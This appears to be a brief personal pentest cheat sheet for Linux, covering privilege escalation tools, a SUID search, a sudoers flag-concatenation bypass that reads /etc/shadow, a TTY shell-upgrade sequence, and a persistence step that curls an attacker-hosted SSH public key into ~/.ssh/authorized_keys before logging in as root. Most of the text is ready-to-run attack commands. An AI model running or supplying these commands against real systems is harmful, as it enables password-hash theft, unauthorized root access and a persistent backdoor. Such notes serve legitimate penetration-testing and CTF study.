# Notes Pentest Linux

## Privesc Linux

### Linpeas - Find privilege escalation vectors

source : https://github.com/carlospolop/PEASS-ng/

### Pspy - Monitor linux process

source : https://github.com/DominicBreuker/pspy/

### Find SUID files

```bash
find / -perm -u=s -type f 2>/dev/null
```

### Misconfigured sudoers

```bash
sudo -l
[...]
(ALL) NOPASSWD: /bin/date *, !/bin/date *-f*, !/bin/date *--file*
```

It is possible to concatenate flags and bypass the restriction :

```bash
sudo /bin/date -uf /etc/shadow # -u for UTC date, -f for file
```

exploit : https://gtfobins.github.io/

## Upgrade a shell (/bin/bash)

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
#CTRL+Z
stty raw -echo
fg
reset
export SHELL=bash
export TERM=xterm256-color
stty rows 38 columns 116
```

## Persistence

### setup python server

```bash
python -m http.server 8000
```

### SSH keys

```bash
curl http://10.10.X.X:8000/id_rsa.pub >> ~/.ssh/authorized_keys
ssh root@10.10.X.X -i ~/Documents/tools/id_rsa
```
